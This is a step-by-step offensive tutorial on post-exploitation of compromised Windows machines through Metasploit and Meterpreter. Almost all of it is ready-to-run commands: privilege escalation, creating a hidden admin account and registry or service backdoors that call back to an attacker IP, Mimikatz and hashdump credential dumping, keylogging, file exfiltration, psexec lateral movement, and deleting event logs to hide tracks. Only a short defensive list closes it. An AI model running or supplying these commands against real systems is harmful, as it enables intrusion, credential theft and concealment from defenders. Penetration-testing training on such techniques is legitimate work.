Once you have gained access to a Windows machine using Metasploit and Meterpreter, post-exploitation involves leveraging that access to extract information, escalate privileges, maintain persistence, and move laterally within the network.

### **1. Gaining Access to a Windows System**
Before post-exploitation, you need an active Meterpreter session, typically obtained using:
- Exploiting a vulnerability (e.g., MS17-010 EternalBlue)
- Using a malicious payload (e.g., `windows/meterpreter/reverse_tcp`)
- Social engineering (e.g., phishing, malicious USB drop)

To check active sessions:
```bash
msfconsole
sessions -l
```
To interact with a session:
```bash
sessions -i <session_id>
```

---

## **Post-Exploitation Techniques**

### **2. System Enumeration**
Gather system details:
```bash
sysinfo
```
Get user details:
```bash
getuid
```
List running processes:
```bash
ps
```
Check network interfaces:
```bash
ifconfig
```
Retrieve environment variables:
```bash
getenv
```
Dump credentials (if running as SYSTEM):
```bash
hashdump
```

---

### **3. Privilege Escalation**
If the current user lacks administrative privileges, escalate using:
```bash
getsystem
```
If `getsystem` fails, try local privilege escalation exploits:
```bash
use exploit/windows/local/bypassuac
set SESSION <id>
exploit
```
Check for misconfigurations that allow privilege escalation:
```bash
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

---

### **4. Maintaining Persistence**
#### **Method 1: Creating a New User**
```bash
execute -f cmd.exe -i -H
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
```

#### **Method 2: Registry Persistence**
Add a registry entry to auto-start Meterpreter:
```bash
reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d "C:\\Users\\Public\\backdoor.exe"
```

#### **Method 3: Service Persistence**
```bash
run persistence -X -i 30 -p 4444 -r <attacker_ip>
```

---

### **5. Credential Dumping**
Extract stored credentials using Mimikatz:
```bash
load mimikatz
wdigest
kerberos
```
Dump credentials from LSASS:
```bash
run post/windows/gather/credentials/mimikatz
```

---

### **6. Capturing Keystrokes**
```bash
keyscan_start
```
To view captured keystrokes:
```bash
keyscan_dump
```
Stop keylogging:
```bash
keyscan_stop
```

---

### **7. Capturing Screenshots**
```bash
screenshot
```

---

### **8. Exfiltrating Files**
Download a file from the target:
```bash
download C:\\Users\\victim\\Desktop\\passwords.txt
```
Upload a file:
```bash
upload backdoor.exe C:\\Users\\Public\\backdoor.exe
```

---

### **9. Lateral Movement**
Pivot to another machine using a captured credential:
```bash
use exploit/windows/smb/psexec
set RHOST <target_ip>
set SMBUser <user>
set SMBPass <password>
exploit
```

---

### **10. Clearing Tracks**
Delete event logs:
```bash
clearev
```
Remove history:
```bash
rm -rf C:\\Windows\\Prefetch\\*
```

---

## **Defensive Measures**
Organizations can mitigate these attacks by:
- Applying patches (e.g., disable SMBv1)
- Using endpoint protection (EDR/XDR)
- Enabling Windows Defender Attack Surface Reduction (ASR)
- Implementing least privilege access
- Monitoring logs and PowerShell activity
